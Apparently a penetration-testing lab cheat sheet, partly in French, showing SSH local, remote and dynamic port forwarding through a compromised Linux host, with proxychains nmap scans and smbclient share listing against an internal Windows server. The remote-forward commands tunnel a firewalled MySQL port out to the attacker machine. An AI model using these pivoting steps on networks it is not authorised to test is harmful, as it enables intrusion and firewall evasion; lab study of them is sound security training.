---
title: Tunneling_Linux
permalink: /Tunneling/Linux
---
#We will not technically issue any ssh commands (-N) but will set up port forwarding (with -L), bind port 445 on our local machine (0.0.0.0:445) to port 445 on the Windows Server (192.168.1.110:445) and do this through a session to our original Linux target, logging in as student (student@10.11.0.128):
```kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128```
At this point, any incoming connection on the Kali Linux box on TCP port 445 will be forwarded to TCP port 445 on the 192.168.1.110 IP address through our compromised Linux client.

## Finally, we can try to list the remote shares on the Windows Server 2016 machine by pointing the request at our Kali machine.

```kali@kali:~# smbclient -L 127.0.0.1 -U Administrator```

## SSH Remote Port Forwarding ##

A port is opened on the remote side of the connection and traffic sent to that port is forwarded to a port on our local machine we have access to a non-root shell on a Linux client on the internal network. On this compromised machine, we discover that a MySQL server is running on TCP port 3306. Unlike the previous scenario, the firewall is blocking inbound TCP port 22 (SSH) connections, so we can’t SSH into this server from our Internet-connected Kali machine. We can, however, SSH from this server out to our Kali attacking machine, since outbound TCP port 22 is allowed through the firewall.


0n linux client
```root@debian:~# cat /root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh```

We will ssh out to our Kali machine as the kali user (kali@10.11.0.4), specify no commands (-N), and a remote forward (-R). We will open a listener on TCP port 2221 on our Kali machine (10.11.0.4:2221) and forward connections to the internal Linux machine’s TCP port 3306 (127.0.0.1:3306)

# Avant tout, penser à vérifier la conf 
```vim /etc/ssh/sshd_config```
# Et à restart ssh
```sudo service ssh start```

```student@debian:~$ ssh -N -R $kali_ip:2221:127.0.0.1:3306 kali@$kali_ip```

This will forward all incoming traffic on our Kali system’s local port 2221 to port 3306 on the compromised box through an SSH tunnel (TCP 22),allowing us to reach the MySQL port even though it is filtered at the firewall

```kali@kali:~$ ss -antp | grep "2221"````
```kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221```

## SSH Dynamic Port Forwarding ##

(For several ports and ips adresses)

``` kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128``` 
```kali@kali:~$ cat /etc/proxychains.conf```  
```socks4 127.0.0.1 8080```  
````kali@kali:~$ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110```
